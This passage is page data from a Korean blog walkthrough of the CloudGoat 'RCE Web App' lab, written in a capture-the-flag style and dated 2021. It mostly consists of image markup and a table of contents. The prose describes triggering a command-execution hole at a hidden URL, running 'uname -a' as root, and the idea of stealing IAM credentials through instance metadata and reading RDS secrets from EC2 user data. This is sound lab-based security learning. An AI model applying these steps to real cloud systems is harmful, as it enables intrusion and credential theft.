url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAACUElEQVQ4y42TWW/aQBSFx2AgLN7GC97wgh0vQAJhp4rSZulb1D71//+UU92hRFaaVnk4GjEe7v3OXdjx/gGr9RFVfYfF7R7r5R7O9gXu/IjFbIUsv4EXZEjSGmFUIAlLvA7v8IufsO17CJwQcs9Ef+jiajAGs50M18UaRbVBnC4wdnMoZoqREcHgERQtQLtjQO5yyF0TnS6HIttQOw6uWjrkjgHW0iC1dbRkA6zXdzBSA3ArQZQs4AUlLHsKzZjAdnMhP6zg+gW4lcK0p1D4BJoVw/ELmM5UvHHc/ExomDEGioc0W+Lr4ys2u284fPmO3eEJu+MzHp9/4OnlJw6nF4TxHMGkhmEmMO0UppXCHmciGCXr9CwwwmVsKDJt9o+o5wfMFkcU9Rbzm5MoxTRfifuy3goH3StbWLzYvIh+s3aHg0mqyLK8u4cXVijrHeL0RlATiUgqqeJs/vkjMVHIlibq6DZqMlR8MKZ8SPH+rqlzQEmFzmPRFKIiu0RG1i72mgGb518Bmw9I19UGt6t7TOK5OMk+NcL1S2g8+i/dGyE9ojnrD8dQtBDUeZo/VZ+IUlD33tv+Z8D3Fopqi9X6QRBSk6rZXhBS0yjBpwlpKGl9iFDnEUaqLxpDg08b8mlCMTYtTWzGed72yMuNoCLbzVG5SBbiaDfvL2NDo8EkTZBwO4VmRFCGLnQ9BBMPzt/FydSzWiMwaQjW1t72WLoQxskMpLE3hevnCPwMg+gWI6+A59JqpdB5gLE7heXEcKwE20GJk7lE1nPA1TFkatofwt8fs3DoVOEI2AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/c70826074a1e0b83e09743debcbe3b17/37523/16.png\"\n        srcset=\"/static/c70826074a1e0b83e09743debcbe3b17/e9ff0/16.png 180w,\n/static/c70826074a1e0b83e09743debcbe3b17/f21e7/16.png 360w,\n/static/c70826074a1e0b83e09743debcbe3b17/37523/16.png 720w,\n/static/c70826074a1e0b83e09743debcbe3b17/c4b7c/16.png 903w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>load balancer가 <code class=\"language-text\">active</code> 인 상태로 있고 <code class=\"language-text\">DNSName</code> 을 통해서 웹 애플리케이션에 접속을 해보겠습니다.</li>\n</ul>\n<h3 id=\"웹-애플리케이션-접근-및-rce-취약점-트리거\" style=\"position:relative;\"><a href=\"#%EC%9B%B9-%EC%95%A0%ED%94%8C%EB%A6%AC%EC%BC%80%EC%9D%B4%EC%85%98-%EC%A0%91%EA%B7%BC-%EB%B0%8F-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-%ED%8A%B8%EB%A6%AC%EA%B1%B0\" aria-label=\"웹 애플리케이션 접근 및 rce 취약점 트리거 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>웹 애플리케이션 접근 및 RCE 취약점 트리거</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 45.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABqUlEQVQoz62QzW7aQBRGvam66aJqCBhjMMbmLwGSKBFKu6ra96NRAUGyoAvaLpJVpL5BpUh9hpAoDTYttlJBzaa28ak8ChVSsuwnHX333pm5c2ekZ8/TGOYWpXKdSrWBli8hyzmUjI6SyQvSSp6sZqDpBoqqoWo6SlYjreZELps7ZPQyG4qKVG0c8L7d5uzslJOTYzrdjvB+v8/xvXe7HXq9Hu12m1arxdG7IwaDAcPhkM+fPvLhy1eGp+cc1vaQcloN2/5BrJ/TKWPLFm7bEyx7wh/fxw8CwnBJEIYEQSB4TK+bb5BkpcTl5ZUo3N39wnEcpo6D67o4rstsNmM2mwv3PA/PW7BYLPjteczncxEvowjf92m+eoukqBVGo2vRMC7GrKaIWa/FiqJIsNIqDsOQ7VoTSc1VGV1d/yuuDjzGcrl8QPwV8Vp84Xb9EKlQ3OX2dsz/UL3xEikpm1xcfMNxXNHYsibCHzC2hI/HlmB9Lc5vbr5TruwjvUjoqLktNL2GUdwlk62SSBbYTBXYTN6TKpBKmySSOrqxI55mFveIh1nf++TpBn8BzCIezrtNzOEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/4a324f0656901eafbe32341ff26f00e9/37523/17.png\"\n        srcset=\"/static/4a324f0656901eafbe32341ff26f00e9/e9ff0/17.png 180w,\n/static/4a324f0656901eafbe32341ff26f00e9/f21e7/17.png 360w,\n/static/4a324f0656901eafbe32341ff26f00e9/37523/17.png 720w,\n/static/4a324f0656901eafbe32341ff26f00e9/302a4/17.png 1080w,\n/static/4a324f0656901eafbe32341ff26f00e9/07a9c/17.png 1440w,\n/static/4a324f0656901eafbe32341ff26f00e9/1acf3/17.png 1596w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 도메인에 접속을 해보니 <code class=\"language-text\">Gold-Star</code>  를 가기위한 티켓을 팔고 있는 거 같고 해당 글을 읽어보면 티겟이 있는 경우 secret URL로 접근을 하라는 메시지가 있다.</li>\n<li>아까 ELB 로그를 통해서 비밀스러운 URL 이 존재한다는 것을 알 수 있었는데</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 329px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 88.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC+klEQVQ4y2VU247iRhRswMaAMfiCsQ3G2PjCfZjMbJKZbPbyOK9JNg+rlSLlS3ZXG2WlKP9cUZ2GQUkeSn369Ok+5VMFanVcozg0AsZePEd1u0W2qbB7OMKLUyg1gmqNBa2OC9V2odRYo3VF2/Cg6m+2KE8beYSxH6fYvNij2Dc4/HCDimenDcqbDWblSsDGx5cnybGuudvJfbMXQFn2BD07RLc/OSN43lt2KEXcD0ZTsLbvTNF3Qjlj3Bvq2qEXa4ZxnoOIiGUuB2QRLZfIdw3m1UqjXGEyzwTzuhTWmnGBxbqSGmHoRXO4Uw1+7mAcwU9SjIIEAddJInNl7PgJ3OlM1yap1I/DmWC6WKJjelBkZLsRHD8WduxyiXnh0owN2MweR/JAmGZwgkTyJMW10/WhFk2JtC6FMlcyWG5rxEWOfN8gWRVIm1JyUbaU8bBudViLEy73KJTBB00rEFaG5UsH0uae4nDw1mAi4OAveQpBQaSG57aukU8W6Q9r6ciYs6F9sk2N7XcHObtYikwWTSV1h8cbyfEeBdp8u9ei/M+gF9NKrPfPZj6bt3WOr3e04cU2NDW/n10ZU1EalZbZPx6lO/cXhgQZn17fSo731i/2AmHI2THomHp+3Au6emVXxpwX91ylvutfZ296Yn5hyFlldaXRVHDDOYpdg0VVorndIt/W8vPKdzWSohCVGXO+VJ5Kr45aB2HYcwIYfggVhmgHEyjLQdv1oYYurChB141heRGcyQzmwIftRWJ22ot+HPoxrGGA8TSRr1T3r97gd/sBf6u3+DJ8wtfsF/yR/oS/op/xQS3wsjfEk5+g8GLc3D3AdedQyjn/24zQNnxk+RGen0O1RlB3r17jt9H3+Kre4KP/hM/Nr/jUvMOfy3d4rzL86Pp4mqZYTRKc7h/hBwtRlWyorNWfol7fI5o1+kGlBlBtG8ocQLX6UMq6wrjY6Px/qOyrdc42EUsxrxwtCjsZhgez48M0/g2j46FjaLCYtf99TOe958f/ARK7yOe3+D3iAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/18ec225bba413fe5e58491af517df50a/004a5/18.png\"\n        srcset=\"/static/18ec225bba413fe5e58491af517df50a/e9ff0/18.png 180w,\n/static/18ec225bba413fe5e58491af517df50a/004a5/18.png 329w\"\n        sizes=\"(max-width: 329px) 100vw, 329px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABF0lEQVQY04WMu0rDYACFsxWKrU0soYltbJteEMc6OEhdfSBzKUkGR0HwIXwBV2ffwcHBUZC2pqnGpv2TfEIUQQc9cDhwblJD66A22tRknZqsISs6NUX/VlU1aLa6GKZJe9DD6Jl0hn1aXRPdHGD0+xjDHo1Om+qOhuR5HrZtc2ZZOI6D6zo4rlN4lmXh+z5B4ON7HhN38tVxCYIA++oa9/yC4f4B1bpGfddAEusVy3BG/BoRhgvm8xeiaMliETGdzVitEv7CRghGx2PKiora3EN6jjY8Ttc8hQlJkiCE+DHI8hyRpqS/KERa5O9v75wenrBVlqkoOtLtA1zewc3950Ge58VJ/g+zLCv6cRxzNBpTKtWpbDf5APNcGtAY7eOSAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/1ea1d42068805090cb63b9eb5d27ef8e/37523/19.png\"\n        srcset=\"/static/1ea1d42068805090cb63b9eb5d27ef8e/e9ff0/19.png 180w,\n/static/1ea1d42068805090cb63b9eb5d27ef8e/f21e7/19.png 360w,\n/static/1ea1d42068805090cb63b9eb5d27ef8e/37523/19.png 720w,\n/static/1ea1d42068805090cb63b9eb5d27ef8e/302a4/19.png 1080w,\n/static/1ea1d42068805090cb63b9eb5d27ef8e/07a9c/19.png 1440w,\n/static/1ea1d42068805090cb63b9eb5d27ef8e/fba00/19.png 1529w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 URL 쪽으로 이동하게 되면 특정 문자열을 입력할 수있는 공간이 생깁니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAlUlEQVQY06XD0QqCMBiA0b10Fz1WN1GPEUQR3aSFZjAt59z+ufkFBd2PDhwVpgk7us/ROdynJ6aUfZ5n1OY0s1jDcgurA39TpTbsKsO5DRQvoXWCdkLr808poZ7jSNUbtAQeTqjtd2V93sEjMaGa54P99UjR3bjokkKXlN2N2jbU9p5VoqAkBXoZeHnz2/sBE2z2mCJvG03OD0xKYcAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/25be06c714ccc4a892f65a0610573c81/37523/20.png\"\n        srcset=\"/static/25be06c714ccc4a892f65a0610573c81/e9ff0/20.png 180w,\n/static/25be06c714ccc4a892f65a0610573c81/f21e7/20.png 360w,\n/static/25be06c714ccc4a892f65a0610573c81/37523/20.png 720w,\n/static/25be06c714ccc4a892f65a0610573c81/302a4/20.png 1080w,\n/static/25be06c714ccc4a892f65a0610573c81/2eb79/20.png 1256w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>오 커맨드를 입력하라는 곳에 커맨드를 입력해보면 리눅스 명령이 실행되고 이는 리눅스 서버라는 사실을 알 수 있으며 현재 돌아가는 데몬은 root권한인 것도 알 수 가 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAqUlEQVQY06WL2w2CMBSGO6xxEydwD+MIvrmChjvEitDaFqSQ0PqbUECij5zky3/LIcYY9MbCWAsz6QrI/gxsj8DmAOxOgH1j1RHvLnHJG8TSIlM9dG9WQVIucC0YqG6RvTSiqkX4i9L/3Yx2+wi5sRwpo+CtAtMSXAvwWScvF91ia1wWXQXRqQHyaBh8Fg8EPIFfRmOOZh88k2/HYnil27wiHH7Smjoqig+aNspjptgFugAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/d6cbe7d9c441701cdbd4c7c04e9ef020/37523/21.png\"\n        srcset=\"/static/d6cbe7d9c441701cdbd4c7c04e9ef020/e9ff0/21.png 180w,\n/static/d6cbe7d9c441701cdbd4c7c04e9ef020/f21e7/21.png 360w,\n/static/d6cbe7d9c441701cdbd4c7c04e9ef020/37523/21.png 720w,\n/static/d6cbe7d9c441701cdbd4c7c04e9ef020/620ae/21.png 1043w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>다음과 같이 리눅스 명령이 실행이 가능하기 때문에 RCE 취약점에 대해 트리거를 할 수있으며 <code class=\"language-text\">uname -a</code> 명령을 통해서 서버의 세부 정보를 확인할 수 가 있 습니다.</li>\n<li>EC2 인스턴스의 애플리케이션에서 RCE 를 발견한 경우 가장 가치가 있는 작업은 IMDS를 사용하여 IAM 자격 증명을 훔치는 것입니다.</li>\n<li>IAM Credential 외에 인스턴스 Metadata 를 사용해서 EC2 인스턴스를 시작할 때 지정된 사용자 데이터에 액세스를 할 수있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABKklEQVQoz5XP226CQBAGYN7/odrUA6gchV0FObWC1SoiRlsQlv4NE5tae9WLLzP/bGaSlWoh4L3tEe6PCLMjgl2BICsoL0/lv9RtC6kRAtFmhe25QFF/4HB5/6s6I/9W3vR3RHewFjWUWEPfH0Nb2TDWzhWDuWHUT7cz2Ls5nMwFyz04+477W+aiFBWkum0wfjbxyId4nMnkgQ0oP7kKGQQqeu4Iw0DFKDagJlPoKwdaYlPtspbaKMXl52DPG0GJdMihhoGv0nLXd7NOfzGhGQk1yJFOe+aaw3hl9KOyqSA1nw2UWIcc67C2c7DcBy8Cquzgg+ULwg8+uZ3dq9oLpLKuMIlMyJ4K/WUKLbYoG0sHZsJgpRzO2qVqJRxWOrtWTu/m8iplOJVnfAFRRPs2UEoWngAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/b9d677c108554b6ffe230396c8f95eb5/37523/22.png\"\n        srcset=\"/static/b9d677c108554b6ffe230396c8f95eb5/e9ff0/22.png 180w,\n/static/b9d677c108554b6ffe230396c8f95eb5/f21e7/22.png 360w,\n/static/b9d677c108554b6ffe230396c8f95eb5/37523/22.png 720w,\n/static/b9d677c108554b6ffe230396c8f95eb5/302a4/22.png 1080w,\n/static/b9d677c108554b6ffe230396c8f95eb5/cd138/22.png 1220w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>다음과 같이 EC2의 사용자 데이터에는 EC2 인스턴스에서 RDS 인스턴스에 연결하기 위한 명령들이 포함되어 있습니다</li>\n<li>해당 명령에서는 RDS 인스턴스에 대한 Credential, Endpoint가 포함되어 있고 해당 파일은 RDS 인스턴스에 저장된 비밀정보를 확인할 수 있습니다.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\">시나리오 개요</a></p>\n<ul>\n<li><a href=\"#%EC%9E%90%EC%9B%90\">자원</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\">취약점</a></li>\n<li><a href=\"#%EB%AA%A9%ED%91%9C\">목표</a></li>\n<li><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 흐름도</a></li>\n<li><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\">시나리오 환경설정</a></li>\n<li><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 시나리오 흐름도</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\">Exploit 시나리오</a></p>\n<ul>\n<li><a href=\"#rds-amazon-relational-database-service\">RDS (Amazon Relational Database Service)</a></li>\n<li><a href=\"#iam-user-mcduck-%EC%A0%91%EA%B7%BC-%EA%B0%80%EB%8A%A5%ED%95%9C-%EC%A0%95%EC%B1%85-%EB%82%98%EC%97%B4\">IAM User: McDuck 접근 가능한 정책 나열</a></li>\n<li><a href=\"#s3-bucket-%EB%A6%AC%EC%8A%A4%ED%8A%B8-%EB%B6%84%EC%84%9D%EB%B0%8F-%ED%95%98%EB%93%9C-%EC%BD%94%EB%94%A9%EB%90%9C-ssh-key-%EC%88%98%EC%A7%91\">S3 Bucket 리스트 분석및 하드 코딩된 SSH key 수집</a></li>\n<li><a href=\"#ssh-%EC%A0%91%EC%86%8D%EC%A0%84-%EC%A4%80%EB%B9%84-%EA%B3%BC%EC%A0%95\">SSH 접속전 준비 과정</a></li>\n<li><a href=\"#%EC%A0%91%EA%B7%BC-%EA%B0%80%EB%8A%A5%ED%95%9C-s3-bucket-%EB%B6%84%EC%84%9D\">접근 가능한 S3 Bucket 분석</a></li>\n<li><a href=\"#rds-instance-%EB%82%98%EC%97%B4-%EB%B0%8F-postgresql-%EC%A0%91%EC%86%8D\">RDS Instance 나열 및 PostgreSQL 접속</a></li>\n<li><a href=\"#lara-iam-user-%ED%97%88%EC%9A%A9%EA%B0%80%EB%8A%A5%ED%95%9C-%EC%A0%95%EC%B1%85-%EB%B6%84%EC%84%9D\">Lara IAM User 허용가능한 정책 분석</a></li>\n<li><a href=\"#elb-%EB%A1%9C%EA%B7%B8-%EC%88%98%EC%A7%91-%EB%B0%8F-%EB%B6%84%EC%84%9D\">ELB 로그 수집 및 분석</a></li>\n<li><a href=\"#%EC%9B%B9-%EC%95%A0%ED%94%8C%EB%A6%AC%EC%BC%80%EC%9D%B4%EC%85%98-%EC%A0%91%EA%B7%BC-%EB%B0%8F-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-%ED%8A%B8%EB%A6%AC%EA%B1%B0\">웹 애플리케이션 접근 및 RCE 취약점 트리거</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 7 (CloudGoat: RCE Web APP)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-7/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/cloud-service-vuln-5/","nextSlug":"/cloud-service-vuln-4/","prevSlug":"/cloud-service-vuln-7/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}